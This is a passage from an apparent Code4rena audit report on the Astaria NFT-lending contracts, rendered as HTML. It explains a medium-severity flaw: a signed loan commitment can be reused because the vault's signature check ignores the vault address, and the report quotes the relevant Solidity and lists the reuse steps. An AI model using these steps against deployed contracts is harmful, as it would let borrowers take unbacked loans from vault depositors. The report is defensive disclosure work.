0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/589\">[M-01] A user can use the same proof for a commitment more than 1 time</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/589\">m9800</a>, also found by <a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/140\">ladboy233</a></em></p>\n<p>A user can use the same commitment signature and merkleData more than 1 time to obtain another loan.</p>\n<h3 id=\"proof-of-concept-19\" style=\"position:relative;\"><a href=\"#proof-of-concept-19\" aria-label=\"proof of concept 19 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>A user needs to make some procedures to take a loan against an NFT.<br>\nNormally the user calls commitToLiens() in AstariaRouter.sol providing IAstariaRouter.Commitment[] as input.<br>\n<a href=\"https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/AstariaRouter.sol#L490\">https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/AstariaRouter.sol#L490</a></p>\n<p>The function will transfer the NFT to the CollateralToken contract to get a collateral id for the user (see CollateralToken.onERC721Received() ).</p>\n<p>After that, the function in the router will make an internal call _executeCommitment() for each commitment.<br>\n_executeCommitment() checks the collateral id and the commitment.lienRequest.strategy.vault and then calls commitToLien in\ncommitment.lienRequest.strategy.vault with the commitment and the router address as the receiver (ie: address (this)).</p>\n<p><a href=\"https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/AstariaRouter.sol#L761\">https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/AstariaRouter.sol#L761</a></p>\n<p>_executeCommitment() in AstariaRouter.sol</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"57\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">_executeCommitment</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">RouterStorage</span><span class=\"mtk1\"> </span><span class=\"mtk12\">storage</span><span class=\"mtk1\"> </span><span class=\"mtk12\">s</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    IAstariaRouter.Commitment </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">c</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  )</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">internal</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      ILienToken.Stack[] </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">stack</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">payout</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    )</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">collateralId</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">c</span><span class=\"mtk1\">.</span><span class=\"mtk12\">tokenContract</span><span class=\"mtk1\">.</span><span class=\"mtk11\">computeId</span><span class=\"mtk1\">(</span><span class=\"mtk12\">c</span><span class=\"mtk1\">.</span><span class=\"mtk12\">tokenId</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\"> != </span><span class=\"mtk12\">s</span><span class=\"mtk1\">.</span><span class=\"mtk12\">COLLATERAL_TOKEN</span><span class=\"mtk1\">.</span><span class=\"mtk11\">ownerOf</span><span class=\"mtk1\">(</span><span class=\"mtk12\">collateralId</span><span class=\"mtk1\">)) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">InvalidSenderForCollateral</span><span class=\"mtk1\">(</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">, </span><span class=\"mtk12\">collateralId</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (!</span><span class=\"mtk12\">s</span><span class=\"mtk1\">.</span><span class=\"mtk12\">vaults</span><span class=\"mtk1\">[</span><span class=\"mtk12\">c</span><span class=\"mtk1\">.</span><span class=\"mtk12\">lienRequest</span><span class=\"mtk1\">.</span><span class=\"mtk12\">strategy</span><span class=\"mtk1\">.</span><span class=\"mtk12\">vault</span><span class=\"mtk1\">]) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">InvalidVault</span><span class=\"mtk1\">(</span><span class=\"mtk12\">c</span><span class=\"mtk1\">.</span><span class=\"mtk12\">lienRequest</span><span class=\"mtk1\">.</span><span class=\"mtk12\">strategy</span><span class=\"mtk1\">.</span><span class=\"mtk12\">vault</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">//router must be approved for the collateral to take a loan,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk15\">return</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk11\">IVaultImplementation</span><span class=\"mtk1\">(</span><span class=\"mtk12\">c</span><span class=\"mtk1\">.</span><span class=\"mtk12\">lienRequest</span><span class=\"mtk1\">.</span><span class=\"mtk12\">strategy</span><span class=\"mtk1\">.</span><span class=\"mtk12\">vault</span><span class=\"mtk1\">).</span><span class=\"mtk11\">commitToLien</span><span class=\"mtk1\">( </span><span class=\"mtk3\">// HERE</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">c</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  }</span></span></span></code></pre>\n<p>commitToLien() function in VaultImplementation:</p>\n<p><a href=\"https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/VaultImplementation.sol#L287\">https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/VaultImplementation.sol#L287</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"58\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">commitToLien</span><span class=\"mtk1\">( </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    IAstariaRouter.Commitment </span><span class=\"mtk12\">calldata</span><span class=\"mtk1\"> </span><span class=\"mtk12\">params</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">receiver</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  )</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">external</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">whenNotPaused</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">lienId</span><span class=\"mtk1\">, ILienToken.Stack[] </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">stack</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">payout</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">_beforeCommitToLien</span><span class=\"mtk1\">(</span><span class=\"mtk12\">params</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">slopeAddition</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    (</span><span class=\"mtk12\">lienId</span><span class=\"mtk1\">, </span><span class=\"mtk12\">stack</span><span class=\"mtk1\">, </span><span class=\"mtk12\">slopeAddition</span><span class=\"mtk1\">, </span><span class=\"mtk12\">payout</span><span class=\"mtk1\">) = </span><span class=\"mtk11\">_requestLienAndIssuePayout</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">params</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">receiver</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">_afterCommitToLien</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">stack</span><span class=\"mtk1\">[</span><span class=\"mtk12\">stack</span><span class=\"mtk1\">.</span><span class=\"mtk12\">length</span><span class=\"mtk1\"> - </span><span class=\"mtk7\">1</span><span class=\"mtk1\">].</span><span class=\"mtk12\">point</span><span class=\"mtk1\">.</span><span class=\"mtk12\">end</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">lienId</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">slopeAddition</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  }</span></span></span></code></pre>\n<p>The function in the Vault will among other things request a lien position and issue the payout to the user requesting the loan via\n_requestLienAndIssuePayout().<br>\n<a href=\"https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/VaultImplementation.sol#L379\">https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/VaultImplementation.sol#L379</a></p>\n<p>This function validates the commitment with the signature against the address of the owner of the vault or the delegate.<br>\nTo recover the address with ecrecover an auxiliary function is used to encode the strategy data <code>(_encodeStrategyData() )</code> but the strategy.vault is not being taken into account in the bytes returned nor the strategy version.</p>\n<p><a href=\"https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/VaultImplementation.sol#L229\">https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/VaultImplementation.sol#L229</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"59\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">_validateCommitment</span><span class=\"mtk1\">( </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    IAstariaRouter.Commitment </span><span class=\"mtk12\">calldata</span><span class=\"mtk1\"> </span><span class=\"mtk12\">params</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">receiver</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  ) </span><span class=\"mtk11\">internal</span><span class=\"mtk1\"> </span><span class=\"mtk11\">view</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">collateralId</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">params</span><span class=\"mtk1\">.</span><span class=\"mtk12\">tokenContract</span><span class=\"mtk1\">.</span><span class=\"mtk11\">computeId</span><span class=\"mtk1\">(</span><span class=\"mtk12\">params</span><span class=\"mtk1\">.</span><span class=\"mtk12\">tokenId</span><span class=\"mtk1\">); </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">ERC721</span><span class=\"mtk1\"> </span><span class=\"mtk12\">CT</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">ERC721</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk11\">COLLATERAL_TOKEN</span><span class=\"mtk1\">()));   </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">holder</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">CT</span><span class=\"mtk1\">.</span><span class=\"mtk11\">ownerOf</span><span class=\"mtk1\">(</span><span class=\"mtk12\">collateralId</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">operator</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">CT</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getApproved</span><span class=\"mtk1\">(</span><span class=\"mtk12\">collateralId</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\"> != </span><span class=\"mtk12\">holder</span><span class=\"mtk1\"> &amp;&amp;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">receiver</span><span class=\"mtk1\"> != </span><span class=\"mtk12\">holder</span><span class=\"mtk1\"> &amp;&amp; </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">receiver</span><span class=\"mtk1\"> != </span><span class=\"mtk12\">operator</span><span class=\"mtk1\"> &amp;&amp;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      !</span><span class=\"mtk12\">CT</span><span class=\"mtk1\">.</span><span class=\"mtk11\">isApprovedForAll</span><span class=\"mtk1\">(</span><span class=\"mtk12\">holder</span><span class=\"mtk1\">, </span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    ) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">InvalidRequest</span><span class=\"mtk1\">(</span><span class=\"mtk12\">InvalidRequestReason</span><span class=\"mtk1\">.</span><span class=\"mtk12\">NO_AUTHORITY</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">VIData</span><span class=\"mtk1\"> </span><span class=\"mtk12\">storage</span><span class=\"mtk1\"> </span><span class=\"mtk12\">s</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">_loadVISlot</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">recovered</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">ecrecover</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk11\">keccak256</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">_encodeStrategyData</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">          </span><span class=\"mtk12\">s</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">          </span><span class=\"mtk12\">params</span><span class=\"mtk1\">.</span><span class=\"mtk12\">lienRequest</span><span class=\"mtk1\">.</span><span class=\"mtk12\">strategy</span><span class=\"mtk1\">,     </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">          </span><span class=\"mtk12\">params</span><span class=\"mtk1\">.</span><span class=\"mtk12\">lienRequest</span><span class=\"mtk1\">.</span><span class=\"mtk12\">merkle</span><span class=\"mtk1\">.</span><span class=\"mtk12\">root</span><span class=\"mtk1\">    </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        )</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      ),</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">params</span><span class=\"mtk1\">.</span><span class=\"mtk12\">lienRequest</span><span class=\"mtk1\">.</span><span class=\"mtk12\">v</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">params</span><span class=\"mtk1\">.</span><span class=\"mtk12\">lienRequest</span><span class=\"mtk1\">.</span><span class=\"mtk12\">r</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">params</span><span class=\"mtk1\">.</span><span class=\"mtk12\">lienRequest</span><span class=\"mtk1\">.</span><span class=\"mtk12\">s</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      (</span><span class=\"mtk12\">recovered</span><span class=\"mtk1\"> != </span><span class=\"mtk11\">owner</span><span class=\"mtk1\">() &amp;&amp; </span><span class=\"mtk12\">recovered</span><span class=\"mtk1\"> != </span><span class=\"mtk12\">s</span><span class=\"mtk1\">.</span><span class=\"mtk12\">delegate</span><span class=\"mtk1\">) ||</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">recovered</span><span class=\"mtk1\"> == </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    ) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk12\">IVaultImplementation</span><span class=\"mtk1\">.</span><span class=\"mtk11\">InvalidRequest</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">InvalidRequestReason</span><span class=\"mtk1\">.</span><span class=\"mtk12\">INVALID_SIGNATURE</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  }</span></span></span></code></pre>\n<p>So _validateCommitment will not revert if I use it with little changes in the Commitment like strategy.vault because there are not going to be changes in _encodeStrategyData().<br>\n<a href=\"https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/VaultImplementation.sol#L178\">https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/VaultImplementation.sol#L178</a></p>\n<p>We saw that the user started the operation in Router but he could have called directly commitToLien in the vault after manually transferring the NFT to Collateral.sol and obtaining the collateral token. Then strategy.vault and strategy.version can be changed by the user breaking the invariant  <strong><em>commitment.strategy.vault == vault where commitToLiens() is being called</em></strong> and the vault will not notice it and will consider the signature of the commitment as valid.</p>\n<p>So the procedure will be the following:</p>\n<ul>\n<li>User takes a loan against an NFT via Router with a valid commitment</li>\n<li>\n<p>User uses the same commitment but takes a loan manually by calling the Vault and CollateralToken contracts changing 2 things:</p>\n<ol>\n<li>The Commitment.lienRequest.strategy.vault, will make a different newLienId = uint256(keccak256(abi.encode(params.lien))); from the previous one. If this change is not made the transaction will fail to try to mint the same id. </li>\n<li>The other change needed to avoid the transaction from failing is the lienRequest.stack provided because the LienToken contract keeps in his storage a track of collateralId previous transactions ( mapping(uint256 => bytes32) collateralStateHash;). So the only thing we need to do is add to stack the previous transaction to avoid validateStack() from reverting.</li>\n</ol>\n</li>\n</ul>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"60\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk12\">modifier</span><span class=\"mtk1\"> </span><span class=\"mtk11\">validateStack</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">collateralId</span><span class=\"mtk1\">, </span><span class=\"mtk12\">Stack</span><span class=\"mtk1\">[] </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">stack</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">LienStorage</span><span class=\"mtk1\"> </span><span class=\"mtk12\">storage</span><span class=\"mtk1\"> </span><span class=\"mtk12\">s</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">_loadLienStorageSlot</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">bytes32</span><span class=\"mtk1\"> </span><span class=\"mtk12\">stateHash</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">s</span><span class=\"mtk1\">.</span><span class=\"mtk12\">collateralStateHash</span><span class=\"mtk1\">[</span><span class=\"mtk12\">collateralId</span><span class=\"mtk1\">];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">stateHash</span><span class=\"mtk1\"> == </span><span class=\"mtk11\">bytes32</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">) &amp;&amp; </span><span class=\"mtk12\">stack</span><span class=\"mtk1\">.</span><span class=\"mtk12\">length</span><span class=\"mtk1\"> != </span><span class=\"mtk7\">0</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">InvalidState</span><span class=\"mtk1\">(</span><span class=\"mtk12\">InvalidStates</span><span class=\"mtk1\">.</span><span class=\"mtk12\">EMPTY_STATE</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">stateHash</span><span class=\"mtk1\"> != </span><span class=\"mtk11\">bytes32</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">) &amp;&amp; </span><span class=\"mtk11\">keccak256</span><span class=\"mtk1\">(</span><span class=\"mtk12\">abi</span><span class=\"mtk1\">.</span><span class=\"mtk11\">encode</span><span class=\"mtk1\">(</span><span class=\"mtk12\">stack</span><span class=\"mtk1\">)) != </span><span class=\"mtk12\">stateHash</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">InvalidState</span><span class=\"mtk1\">(</span><span class=\"mtk12\">InvalidStates</span><span class=\"mtk1\">.</span><span class=\"mtk12\">INVALID_HASH</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">_</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  }</span></span></span></code></pre>\n<ul>\n<li>The signature check via ecrecover done in VaultImplementation will 